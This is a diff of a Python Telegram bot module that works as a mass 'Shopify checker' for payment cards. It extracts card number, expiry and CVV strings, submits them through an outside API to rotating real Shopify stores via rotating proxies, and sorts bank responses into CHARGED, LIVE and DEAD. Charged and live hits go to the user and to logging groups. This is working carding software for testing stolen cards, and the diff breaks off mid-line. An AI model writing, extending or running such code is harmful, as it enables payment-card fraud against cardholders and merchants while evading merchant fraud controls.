@@ -1,42 +1,44 @@
 """
-sh.py  v17  —  /sh single-card + /msh mass Shopify checker
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Framework : python-telegram-bot v21+
+sh.py  v18  —  /sh single-card + /msh mass Shopify checker
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Framework : python-telegram-bot v21  (NOT aiogram)
 API       : https://goshopi.up.railway.app/shopii
-            ?site=BARE_DOMAIN&cc=cc|mm|yy|cvv&proxy=proxy
-            ← proxy IS REQUIRED — without it API returns 404
-Proxies   : px.txt (shuffled, rotated — different proxy per attempt)
-Sites     : sites.txt (shuffled, bare domain stripped automatically)
-Retries   : SITE_RETRIES different sites per card
+            URL: {API_URL}?site={site}&cc={card}&proxy={proxy}
+            proxy = raw ip:port  (NO http:// prefix)
+            Only 3 params — no extra fields!
 
-API RESPONSE FIELDS:
-  Response  — bank/site response string
-  Price     — charge amount (e.g. "1.00")
-  Currency  — currency code (e.g. "USD")
-  Gateway   — must be "SHOPIFY PAYMENTS" or site is bad
-  Proxy     — proxy status string ("live"/"dead")
-  Status    — "true"/"false"
+PROGRESS UI (exact):
+  🛒 Gate ➳ Shopify
+  🔄 Progress ➳ 0/191
+  Charged ➳ 0 💎
+  Live    ➳ 0 ✅
+  Dead    ➳ 0 ❌
+  Errors  ➳ 0 ⚠️
+  Time    ➳ 0s
+  👤 ➳ Tom ⭐
+  ⚡ ➳ Batmancardchk ⭐
 
-VERDICT LOGIC (sourced from sitechk.py / msh.py reference):
-  CHARGED → ORDER_PAID / CHARGED / CAPTURED / PAYMENT_AUTHORIZED
-  TDS     → 3DS_REQUIRED / AUTHENTICATION_REQUIRED
-  LIVE    → INSUFFICIENT_FUNDS / INCORRECT_CVV / DO NOT HONOR /
-            PICK_UP_CARD / AMOUNT_TOO_SMALL / INCORRECT_ZIP / etc.
-  DEAD    → CARD_DECLINED / GENERIC_DECLINE / GENERIC_ERROR /
-            EXPIRED_CARD / FRAUD_SUSPECTED / UNKNOWN_ERROR / etc.
-  RETRY   → gateway ≠ SHOPIFY PAYMENTS, or site error, or network failure
+BUTTONS:
+  Row 1 : [Live (N)]  [All (N)]
+  Row 2 : [⛔ Stop]   ← only while running
+
+DM POLICY:
+  CHARGED → DM to user  +  HIT_LOG_GROUP_ID  +  EXTRA_CHARGED_GROUP_ID
+  LIVE    → DM to user only
+  DEAD    → NOT sent anywhere (just counted)
+  ERROR   → NOT sent anywhere (just counted)
 
 EXPORTS FOR main.py:
-  get_sh_handler()          → single CommandHandler("sh", cmd_sh)
-  _check_card_with_retry()  → retry loop used by main.py's cmd_msh
-  SITE_RETRIES / SITE_TIMEOUT
+  get_sh_handler()
+  _check_card_with_retry, SITE_RETRIES, SITE_TIMEOUT
   MSH_SESSIONS, run_mass_batch, create_msh_session
   cb_msh_result, cb_msh_stop, build_result_msg
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 """
 from __future__ import annotations
 
 import asyncio
+import json as _json
 import logging
 import random
 import re
@@ -52,7 +54,7 @@ from telegram import Update, InputFile
 from telegram.ext import CommandHandler, CallbackQueryHandler, ContextTypes
 
 from config import (
-    OWNER_ID, FORCE_CHANNELS,
+    OWNER_ID,
     get_bin_info, tg_emoji,
     get_plan_emoji_id, get_random_live_emoji,
     RawMarkup, _btn,
@@ -71,26 +73,33 @@ API_URL      = "https://goshopi.up.railway.app/shopii"
 BOT_CHANNEL  = CHANNEL_LINK
 DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'
 
+# Change these to your actual group IDs
 HIT_LOG_GROUP_ID       = -1004361062205
 EXTRA_CHARGED_GROUP_ID = -1003991915326
 
-SH_COOLDOWN    = 25      # free-user cooldown between /sh calls (seconds)
+SH_COOLDOWN    = 25       # free-user cooldown (seconds)
+SITE_RETRIES   = 40       # max sites tried per card
+SITE_TIMEOUT   = 180      # seconds per API request (matches reference)
+MAX_CONCURRENT = 70       # parallel card workers (matches reference sem=70)
+BUTTON_LOCK    = 30       # seconds before download buttons unlock
 
-SITE_RETRIES   = 999     # try ALL sites from sites.txt until a real result
-SITE_TIMEOUT   = 90      # per-request timeout (seconds)
-MAX_CONCURRENT = 80      # parallel cards in mass check
-PROGRESS_EVERY = 3       # update progress bar every N cards
-BUTTON_LOCK    = 10      # lock download buttons for N seconds after start
+_CB_RESULT = "mshr"
+_CB_STOP   = "mshs"
+
+MSH_SESSIONS: dict = {}
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# EMOJI IDS
+# EMOJI IDS  (from reference msh_(8)_1784828416954.py)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-DECLINED_EMOJI_ID    = "4956612582816351459"
-HIT_RESP_EMOJI_ID    = "5839116473951328489"
-BTN_LIVE_EMOJI_ID    = "5039793437776282663"
-BTN_CHARGED_EMOJI_ID = "5465465194056525619"
-BTN_ALL_EMOJI_ID     = "4956324463525233747"
-BTN_STOP_EMOJI_ID    = "6179444193518162239"
+LIVE_EMOJI_ID     = "4958610528588008305"
+DECLINED_EMOJI_ID = "4956612582816351459"
+
+HIT_GATE_EMOJI_ID = "5341715473882955310"
+HIT_RESP_EMOJI_ID = "5839116473951328489"
+
+BTN_LIVE_EMOJI_ID = "5039793437776282663"
+BTN_ALL_EMOJI_ID  = "4956324463525233747"
+BTN_STOP_EMOJI_ID = "6179444193518162239"
 
 CHARGED_EMOJI_IDS = [
     "5801154993188770160", "4956739572114392015", "5285221724634239278",
@@ -101,63 +110,134 @@ CHARGED_EMOJI_IDS = [
     "5891044423856296980", "5436068999068662274", "5427168083074628963",
 ]
 
-_CB_RESULT = "mshr"
-_CB_STOP   = "mshs"
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# CLASSIFIER  (from reference msh_(8)_1784828416954.py)
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-MSH_SESSIONS: dict = {}
+RETRY_ERRORS = [
+    'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
+    'product not found', 'hcaptcha detected', 'tax ammount empty',
+    'del ammount empty', 'product id is empty', 'py id empty',
+    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na',
+    'DELIVERY_ZONE_NOT_FOUND', 'site error! status: 429',
+    'site requires login!', 'failed to get token',
+    'no valid products', 'not shopify!', 'site not supported for now!',
+    'VALIDATION_CUSTOM', 'connection error', 'connection error!',
+    'error processing card', '504', 'server error', 'client error',
+    'failed', 'BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP',
+    'token not found', 'invalid_response', 'resolve', 'item',
+    'curl error', 'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED',
+    'could not resolve host', 'connect tunnel failed', 'timeout',
+    'proxy error',
+    'step 0 failed', 'step 1 failed', 'step 2 failed', 'step 3 failed',
+    'step 4 failed', 'step 5 failed', 'step 6 failed', 'step 7 failed',
+    'step 8 failed', 'step 9 failed', 'step 10 failed',
+    'SESSION_ERROR', 'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE',
+    'DELIVERY_ZONE_NOT_FOUND', 'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED',
+    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE',
+    'DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED',
+    'no available products found', 'could not extract receiptid',
+    'BUYER_IDENTITY_MARKETING_CONSENT_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN',
+    'could not extract signedhandles', 'receiptid missing',
+    'response missing receiptid', 'INVENTORY_FAILURE',
+    'products.json', 'returned status 429', 'returned status 500',
+    'returned status 502', 'returned status 503', 'returned status 504',
+    'store incompatible', 'extract signedHandles', 'missing receiptId',
+    'NO_PRODUCTS', 'NO_PRODUCT', 'VAULT_FAILED', 'MERCHANDISE_OUT_OF_STOCK',
+    'application not found', 'app not found', 'store not found',
+    'site error! status: 404', 'site error! status: 500',
+    'site error! status: 403', 'HTTP Error',
+    'no proxies', 'no available proxies',
+]
+
+DECLINED_RESPONSES = [
+    'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_DECLINE',
+    'DO NOT HONOR', 'DO_NOT_HONOR', 'UNKNOWN_ERROR', 'Processing Error',
+    'PICK_UP_CARD', 'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED',
+    'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD', 'TEST_MODE_LIVE_CARD',
+    'AMOUNT_TOO_SMALL', 'INCORRECT_NUMBER', 'EXPIRED_CARD',
+    'CALL_ISSUER', 'STOLEN_CARD', 'LOST_CARD', 'RESTRICTED_CARD',
+    'TRANSACTION_NOT_ALLOWED', 'GENERIC_ERROR',
+]
+
+
+def classify_response(message: str) -> str:
+    """Returns CHARGED | TDS | LIVE | DEAD | RETRY | ERROR."""
+    if not message:
+        return "RETRY"
+    mu = message.upper()
+    ml = message.lower()
+
+    # CHARGED
+    if "ORDER_PAID" in mu or "CHARGED" in mu or "PAYMENT_AUTHORIZED" in mu:
+        return "CHARGED"
+
+    # 3DS — live, tracked separately
+    if "3DS_REQUIRED" in mu or "AUTHENTICATION_REQUIRED" in mu:
+        return "TDS"
+
+    # LIVE — bank confirmed card exists
+    if ("INSUFFICIENT_FUNDS" in mu or "INCORRECT_CVV" in mu
+            or "INCORRECT_CVC" in mu or "INVALID_CVC" in mu
+            or "INCORRECT_ZIP" in mu or "CVV_FAILED" in mu):
+        return "LIVE"
+
+    # DEAD — hard bank decline
+    if "GENERIC_ERROR" in mu:
+        return "DEAD"
+    if any(d.upper() in mu for d in DECLINED_RESPONSES):
+        return "DEAD"
+
+    # RETRY — site / network / proxy errors
+    if any(r.lower() in ml for r in RETRY_ERRORS):
+        return "RETRY"
+
+    # Unknown
+    return "ERROR"
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # PROXY LOADER  — px.txt first, then proxies.txt
+# Stores raw strings (ip:port) — API wants bare proxy, no http://
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# ── Global proxy pool — loaded once, shared by ALL workers ──────────
 _ALL_PROXIES: list = []
 
+def _strip_proxy_scheme(p: str) -> str:
+    for pfx in ("socks5://", "socks4://", "https://", "http://"):
+        if p.startswith(pfx):
+            return p[len(pfx):]
+    return p
+
 def _load_proxies() -> list:
-    """
-    Load ALL proxies from px.txt (priority) or proxies.txt.
-    Proxies are stored RAW (ip:port or ip:port:user:pass) because the
-    API receives the proxy as a query-string value — NOT as an HTTP URL.
-    Sending 'http://ip:port' causes the API to return 404.
-    """
     global _ALL_PROXIES
-
     import os
-    search_paths = []
+    candidates = []
     for fname in ("px.txt", "proxies.txt"):
-        search_paths.append(fname)
-        search_paths.append(os.path.join("..", fname))
-        search_paths.append(os.path.join(os.path.dirname(__file__), fname))
-
-    for path in search_paths:
+        candidates += [
+            fname,
+            os.path.join("..", fname),
+            os.path.join(os.path.dirname(__file__), fname),
+        ]
+    for path in candidates:
         try:
             with open(path, encoding="utf-8", errors="ignore") as f:
                 raw = [l.strip() for l in f
                        if l.strip() and not l.startswith(("#", "//", ";"))]
             if raw:
-                # Strip any http:// / https:// / socks5:// prefix —
-                # the API wants the bare proxy string, e.g. "1.2.3.4:8080"
-                def _strip_proxy_scheme(p: str) -> str:
-                    for pfx in ("socks5://", "socks4://", "https://", "http://"):
-                        if p.startswith(pfx):
-                            return p[len(pfx):]
-                    return p
                 lines = [_strip_proxy_scheme(p) for p in raw]
                 _ALL_PROXIES = lines
-                logging.info(f"[SH] Loaded {len(lines)} proxies from {path}")
+                logging.info(f"[SH] {len(lines)} proxies from {path}")
                 return lines
         except (FileNotFoundError, PermissionError):
             pass
-
-    logging.warning("[SH] No proxy file found — API REQUIRES proxies (px.txt)!")
+    logging.warning("[SH] No proxy file — API needs proxies (px.txt)!")
     _ALL_PROXIES = []
     return []
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# SITE LOADER — sites.txt, shuffled, bare-domain stripped
+# SITE LOADER  — sites.txt, bare domains
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def _strip_scheme(url: str) -> str:
-    """Remove https:// / http:// / www. from a domain for the API."""
     url = url.strip()
     for pfx in ("https://", "http://", "www."):
         if url.startswith(pfx):
@@ -165,18 +245,13 @@ def _strip_scheme(url: str) -> str:
     return url.rstrip("/")
 
 def _load_sites() -> list:
-    """
-    Load ALL sites from sites.txt (searched in cwd, parent dir, and
-    script dir). Strips https:// so the API gets bare domains.
-    Sites are shuffled so every card starts from a different position.
-    """
     import os
-    search_paths = [
+    candidates = [
         "sites.txt",
         os.path.join("..", "sites.txt"),
         os.path.join(os.path.dirname(__file__), "sites.txt"),
     ]
-    for path in search_paths:
+    for path in candidates:
         try:
             with open(path, encoding="utf-8", errors="ignore") as f:
                 lines = [_strip_scheme(l) for l in f
@@ -184,33 +259,24 @@ def _load_sites() -> list:
             lines = [l for l in lines if l]
             if lines:
                 random.shuffle(lines)
-                logging.info(f"[SH] Loaded {len(lines)} sites from {path}")
+                logging.info(f"[SH] {len(lines)} sites from {path}")
                 return lines
         except (FileNotFoundError, PermissionError):
             pass
-    logging.warning("[SH] sites.txt not found — using fallback site")
     return ["aloracosmetics.myshopify.com"]
-
-def _norm_proxy(p: str) -> str:
-    p = p.strip()
-    if p.startswith(("http://","https://","socks5://","socks4://")):
-        return p
-    return f"http://{p}"
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # CARD UTILITIES
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def luhn_check(n: str) -> bool:
     n = str(n).strip()
-    if not n.isdigit():
-        return False
+    if not n.isdigit(): return False
     total = 0
     for i, c in enumerate(n[::-1]):
         d = int(c)
         if i % 2 == 1:
             d *= 2
-            if d > 9:
-                d -= 9
+            if d > 9: d -= 9
         total += d
     return total % 10 == 0
 
@@ -218,295 +284,88 @@ def is_expired(mm: str, yy: str) -> bool:
     try:
         now = datetime.now()
         ey, em = int(yy), int(mm)
-        if ey < now.year % 100:   return True
+        if ey < now.year % 100: return True
         if ey == now.year % 100 and em < now.month: return True
         return False
     except ValueError:
         return True
 
 def extract_cards(text: str) -> list:
-    pats = [
-        r"(\d{13,19})\s*[|/:=]\s*(\d{1,2})\s*[|/:=]\s*(\d{2,4})\s*[|/:=]\s*(\d{3,4})",
-        r"(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})",
+    patterns = [
+        r'(\d{13,19})\s*[|/:=]\s*(\d{1,2})\s*[|/:=]\s*(\d{2,4})\s*[|/:=]\s*(\d{3,4})',
+        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
     ]
     seen, results = set(), []
-    for pat in pats:
+    for pat in patterns:
         for m in re.findall(pat, text):
             cc, mm, yy, cvv = m
             mm = mm.zfill(2)
             if len(yy) == 4: yy = yy[2:]
             s = f"{cc}|{mm}|{yy}|{cvv}"
             if s not in seen:
-                seen.add(s)
-                results.append(s)
+                seen.add(s); results.append(s)
     return results
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# RESPONSE CLASSIFIER
-# Ground-truth built from sitechk.py SUCCESS_RESPONSES + DEAD_ERRORS
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-# These mean the SITE is broken — try a different site, don't touch the card
-# (Sourced verbatim from sitechk.py DEAD_ERRORS)
-_SITE_ERRORS = {
-    "site error! status: 404", "site error! status: 500",
-    "site error! status: 402", "site error! status: 502",
-    "site error! 503",         "site error! status: 503",
-    "site error! status: 403", "site error! status: 401",
-    "site not supported for now!",
-    "connection error", "connection error!",
-    "error processing card",
-    "failed to get token", "failed to get checkout",
-    "failed to add to cart", "site overloaded", "site rate limited",
-    "failed to get session token", "unable to get payment token",
-    "no valid products",
-    "payment method is not shopify!", "not shopify!",
-    "site requires login!", "validation_custom",
-    "timeout", "http error", "json", "curl error",
-    "could not resolve", "connect tunnel failed", "max retries",
-    "amount_too_small",
-    "buyer_identity_marketing_consent",
-    "step 1 failed", "step 0 failed", "step 2 failed", "step 3 failed",
-    "step 4 failed", "step 5 failed", "step 6 failed", "step 7 failed",
-    "step 9 failed", "step 10 failed",
-    "missing stableid", "missing buildid", "missing sourcetoken",
-    "checkout_failed", "delivery_out_of_stock_at_origin_location",
-    "could not extract private_access_token", "no_products",
-    "buyer_identity_currency_not_supported_by_shop",
-    "could not find actions js url", "session_error",
-    "delivery_zone_not_found",
-    "missing proposal", "missing submit id",
-    "delivery_strategy_conditions_not_satisfied",
-    "retryable: inventory reservation failure", "inventory_failure",
-    "delivery_no_delivery_strategy_available_for_merchandise_line",
-    "exceeded 30 poll attempts",
-    "delivery_no_delivery_strategy_available",
-    "could not extract queuetoken",
-    "could not extract identification signature",
-    "could not extract session id",
-    "payments_credit_card_brand_not_supported",
-    "could not extract delivery handle",
-    "could not extract signedhandles",
-    "could not extract shipping amount",
-    "could not extract total amount",
-    "could not extract receiptid",
-    "could not extract sessiontoken",
-    "errstoreincompatible", "errmissingreceiptid",
-    # catch-all network fragments
-    "application not found",
-    "app not found",
-    "store not found",
-    "shop not found",
-    "not found",
-    "proxy error",
-    "no proxies available",
-    "connection reset",
-    "network error",
-    "api timeout",
-    "connection timed out",
-    "connection failed",
-    "invalid json",
-    "json decode",
-    "missing receiptid",
-    "products.json",
-    "site incompatible",
-    "store incompatible",
-    "site not supported",
-    "site overloaded",
-    "delivery_delivery_line_detail_changed",
-}
-
-
-def classify_response(resp: str, gateway: str = "") -> str:
-    """
-    Classify a raw API response into: CHARGED | TDS | LIVE | DEAD | RETRY
-
-    Logic:
-    1. Gateway not "SHOPIFY PAYMENTS" → RETRY (bad site)
-    2. ORDER_PAID / CAPTURED / etc.  → CHARGED
-    3. 3DS_REQUIRED / etc.           → TDS  (card is alive, needs auth)
-    4. INSUFFICIENT_FUNDS / INCORRECT_CVV / etc. → LIVE
-    5. CARD_DECLINED / GENERIC_ERROR / etc.       → DEAD
-    6. Any site error string          → RETRY
-    7. Unknown                        → RETRY (safe default)
-    """
-    # ── 1. Gateway check ────────────────────────────────
-    if gateway and gateway.strip().upper() != "SHOPIFY PAYMENTS":
-        return "RETRY"
-
-    if not resp:
-        return "RETRY"
-
-    ru = resp.upper().strip()
-    rl = resp.lower().strip()
-
-    # ── 2. CHARGED ──────────────────────────────────────
-    if any(x in ru for x in (
-        "ORDER_PAID", "PAYMENT_AUTHORIZED", "PAYMENT_CAPTURED",
-        "TRANSACTION_APPROVED", "SUBSCRIPTION_CREATED",
-        "CHARGE_SUCCEEDED", "CAPTURED",
-    )):
-        return "CHARGED"
-    # plain "CHARGED" word but not inside another token
-    if ru == "CHARGED" or ru.startswith("CHARGED "):
-        return "CHARGED"
-
-    # ── 3. 3DS ──────────────────────────────────────────
-    if any(x in ru for x in (
-        "3DS_REQUIRED", "3D_SECURE", "3D SECURE",
-        "AUTHENTICATION_REQUIRED", "REDIRECT_TO_3DS",
-    )):
-        return "TDS"
-
-    # ── 4. LIVE — bank confirmed card is real ────────────
-    # (sources: sitechk SUCCESS_RESPONSES that mean "soft decline" /
-    #  "card exists but can't charge right now")
-    if any(x in ru for x in (
-        "INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS",
-        "INCORRECT_CVV", "INVALID_CVC", "INCORRECT_CVV",
-        "CVV_FAILED", "CVC_FAILED",
-        "INCORRECT_ZIP", "ZIP_MISMATCH", "ADDRESS_MISMATCH",
-        "PICK_UP_CARD", "PICKUP_CARD",
-        "DO NOT HONOR", "DO_NOT_HONOR",
-        "ONLINE_OR_CONTACTLESS_TRANSACTION_NOT_ALLOWED",
-        "REFER_TO_CARD_ISSUER",
-    )):
-        return "LIVE"
-    if ru == "APPROVED" or (ru.startswith("APPROVED") and "NOT" not in ru):
-        return "LIVE"
-
-    # ── 5. DEAD — confirmed hard bank decline ────────────
-    # These are in sitechk SUCCESS_RESPONSES (site works) but for card
-    # checking they mean the card is definitively dead.
-    if any(x in ru for x in (
-        "CARD_DECLINED",
-        "GENERIC_DECLINE",
-        "GENERIC_ERROR",
-        "UNKNOWN_ERROR",
-        "PROCESSING ERROR",
-        "EXPIRED_CARD",
-        "INVALID_CARD_NUMBER", "INCORRECT_NUMBER",
-        "LOST_CARD", "STOLEN_CARD",
-        "FRAUD_SUSPECTED",
-        "DECISION_RULE_BLOCK",
-        "INVALID_PURCHASE_TYPE",
-        "INVALID_PAYMENT_METHOD",
-        "ACCOUNT_CLOSED", "INVALID_ACCOUNT", "ACCOUNT_FROZEN",
-        "SECURITY_VIOLATION", "SERVICE_NOT_ALLOWED",
-        "TRANSACTION_NOT_ALLOWED", "TRANSACTION NOT ALLOWED",
-        "RESTRICTED_CARD", "RESTRICTED CARD",
-        "WITHDRAWAL_COUNT_LIMIT_EXCEEDED",
-        "TRY_AGAIN_LATER",
-    )):
-        return "DEAD"
-
-    # exact match catch for "Processing Error" (mixed case from API)
-    if rl in ("processing error", "card_declined", "generic_error",
-              "generic_decline", "unknown_error"):
-        return "DEAD"
-
-    # ── 6. RETRY — site error ────────────────────────────
-    if any(s in rl for s in _SITE_ERRORS):
-        return "RETRY"
-    if ru in ("TIMEOUT", "ERROR", "UNKNOWN", ""):
-        return "RETRY"
-
-    # ── 7. Unknown → RETRY (safe: try another site) ─────
-    return "RETRY"
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# API CALL
-# API expects: ?site=BARE_DOMAIN&cc=card&proxy=proxy
+# API CALL  (mirrors msh_(8)_1784828416954.py exactly)
+# Fresh ClientSession per call, f-string URL, text→json.loads
+# Proxy sent as raw ip:port query param — NO http:// prefix
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def _call_api(
-    session: aiohttp.ClientSession,
-    card: str,
-    site: str,              # bare domain (no https://)
+    card: str,       # cc|mm|yy|cvv
+    site: str,       # bare domain
     proxy: Optional[str],
     timeout: float = SITE_TIMEOUT,
-) -> dict:
+) -> tuple:
     """
-    Call goshopi shopii API.
-    API accepts ONLY three params: site, cc, proxy.
-    Sending extra params (billing data etc.) causes HTTP 404.
-    site must be a bare domain e.g. "store.myshopify.com"
-    proxy must be raw "ip:port" — NOT "http://ip:port".
-    proxy is REQUIRED — without it the API returns 404.
+    Returns (api_response_str, gateway_str, price_str, currency_str, http_status).
+    Mirrors process_card_api() from reference msh.py.
     """
-    site = _strip_scheme(site)   # guarantee bare domain, no https://
+    site = _strip_scheme(site)
 
-    # ── ONLY the three params the API accepts ──────────────
-    params: dict = {"cc": card, "site": site}
     if proxy:
-        params["proxy"] = proxy          # raw ip:port, no http:// prefix
-    # ───────────────────────────────────────────────────────
+        url = f"{API_URL}?site={site}&cc={card}&proxy={proxy}"
+    else:
+        url = f"{API_URL}?site={site}&cc={card}"
 
+    http_status = None
     try:
-        async with session.get(
-            API_URL, params=params,
-            timeout=aiohttp.ClientTimeout(total=timeout),
-            ssl=False,
-        ) as resp:
-            # Always try to read the body — even on non-200 the API may
-            # return a JSON object with a useful Response/message field.
-            try:
-                body_text = await resp.text()
-            except Exception:
-                body_text = ""
-
-            if resp.status != 200:
-                # Try to parse as JSON first to get real API message
-                try:
-                    import json as _json
-                    data = _json.loads(body_text)
-                    if isinstance(data, dict) and data:
-                        return data   # use real API response even on 404
-                except Exception:
-                    pass
-                # Fall back to a RETRY-triggering string
-                logging.warning(f"[API] HTTP {resp.status} site={site} body={body_text[:120]}")
-                return {"Response": f"site error! status: {resp.status}",
-                        "Gateway": "", "Price": "0.00", "Currency": "USD"}
-
-            # 200 OK — parse JSON
-            try:
-                import json as _json
-                data = _json.loads(body_text)
-                if isinstance(data, dict):
-                    return data
-                return {"Response": body_text[:200], "Gateway": "",
-                        "Price": "0.00", "Currency": "USD"}
-            except Exception:
-                return {"Response": body_text[:200], "Gateway": "",
-                        "Price": "0.00", "Currency": "USD"}
+        _to = aiohttp.ClientTimeout(total=timeout)
+        async with aiohttp.ClientSession(timeout=_to) as session:
+            async with session.get(url, ssl=False) as resp:
+                http_status = resp.status
+                if resp.status == 200:
+                    raw_text = await resp.text()
+                    try:
+                        data = _json.loads(raw_text)
+                    except Exception:
+                        return ("Error: Invalid JSON", "Shopify Payments",
+                                "0.00", "USD", http_status)
+                    gateway      = str(data.get("Gateway", "Shopify Payments") or "Shopify Payments")
+                    price        = str(data.get("Price",   "0.00") or "0.00")
+                    currency     = str(data.get("Currency","USD")  or "USD")
+                    api_response = str(data.get("Response","Unknown Error") or "Unknown Error")
+                    logging.info(f"[API] {card[:6]}**** | {site} | {api_response}")
+                    return api_response, gateway, price, currency, http_status
+                else:
+                    return (f"HTTP Error {resp.status}", "Shopify Payments",
+                            "0.00", "USD", http_status)
 
     except asyncio.TimeoutError:
-        return {"Response": "timeout", "Gateway": "", "Price": "0.00", "Currency": "USD"}
+        return ("timeout", "Shopify Payments", "0.00", "USD", None)
     except asyncio.CancelledError:
         raise
     except Exception as e:
-        return {"Response": f"connection error: {str(e)[:60]}",
-                "Gateway": "", "Price": "0.00", "Currency": "USD"}
-
-
-def _parse_api(data: dict) -> tuple:
-    """Return (response_str, gateway_str, price_str, currency_str)."""
-    resp     = str(data.get("Response", data.get("response", "")) or "").strip()
-    gateway  = str(data.get("Gateway",  data.get("gateway",  "")) or "").strip()
-    price    = str(data.get("Price",    data.get("price",    "0.00")) or "0.00").strip()
-    currency = str(data.get("Currency", data.get("currency", "USD")) or "USD").strip()
-    return resp, gateway, price, currency
+        msg = f"connection error: {str(e)[:60]}"
+        return (msg, "Shopify Payments", "0.00", "USD", None)
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # CORE RETRY LOOP
-# Tries every site from sites.txt (shuffled) per card.
-# RETRY verdict → skip to next site (site error, card untouched).
-# CHARGED/LIVE/DEAD/TDS → return immediately.
-# If ALL sites return RETRY → ERROR (no working site found).
-# max_sites caps how many sites to try (SITE_RETRIES=999 = all).
+# Tries up to SITE_RETRIES different sites per card.
+# RETRY/ERROR → next site. CHARGED/TDS/LIVE/DEAD → return.
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def _check_card_with_retry(
-    session: aiohttp.ClientSession,
+    session,            # unused — kept for main.py compat
     card: str,
     sites: list,
     proxies: list,
@@ -514,106 +373,71 @@ async def _check_card_with_retry(
     site_timeout: float = SITE_TIMEOUT,
     sid: str = "",
 ) -> tuple:
-    """
-    Returns (verdict, raw_response, price, currency).
-    verdict: CHARGED | TDS | LIVE | DEAD | ERROR
-
-    Tries every site in the pool (up to max_sites) with a fresh random
-    proxy each time.  Stops the moment a bank response is received.
-    Stops after all unique sites are exhausted (does NOT cycle back).
-    """
+    """Returns (verdict, raw_response, price, currency)."""
     if not sites:
         sites = ["aloracosmetics.myshopify.com"]
 
-    # Shuffle a copy so each card gets a different starting site
     pool = sites[:]
     random.shuffle(pool)
-
-    # Use passed-in list OR fall back to global pool.
     px_pool = proxies if proxies else _ALL_PROXIES
 
+    tried: list = []
     price, currency = "0.00", "USD"
     last_resp = "All sites failed"
 
-    # Iterate every site exactly once (capped at max_sites).
-    # No cycling — if all sites fail, card gets ERROR.
-    limit = min(max_sites, len(pool))
-    for attempt in range(limit):
-        # Check stop flag for mass sessions
+    for attempt in range(max_sites):
         if sid and MSH_SESSIONS.get(sid, {}).get("status") == "STOPPED":
             raise asyncio.CancelledError()
 
-        site = pool[attempt]   # already shuffled; each index = unique site
+        # Pick untried site (cycle when exhausted)
+        untried = [s for s in pool if s not in tried]
+        if not untried:
+            tried = []; untried = list(pool)
+        site = random.choice(untried)
+        tried.append(site)
 
-        # Random proxy from the FULL pool — raw "ip:port" string.
-        # The API receives proxy as a query param (NOT an HTTP proxy URL).
-        # Sending "http://ip:port" causes the API to return 404.
-        if px_pool:
-            proxy = random.choice(px_pool)
-        else:
-            proxy = None   # WARNING: API returns 404 without a proxy
+        # Random proxy from full pool — raw ip:port
+        proxy = random.choice(px_pool) if px_pool else None
 
         try:
-            data = await _call_api(session, card, site, proxy, timeout=site_timeout)
+            resp, gw, price, currency, http_st = await _call_api(
+                card, site, proxy, timeout=site_timeout
+            )
         except asyncio.CancelledError:
             raise
         except Exception:
             continue
 
-        resp, gateway, price, currency = _parse_api(data)
-        verdict = classify_response(resp, gateway)
         last_resp = resp
+        verdict   = classify_response(resp)
 
-        logging.debug(f"[SH] {card[:6]}*** attempt={attempt+1}/{limit} "
-                      f"site={site} proxy={proxy} gw={gateway!r} "
+        logging.debug(f"[SH] {card[:6]}** attempt={attempt+1} site={site} "
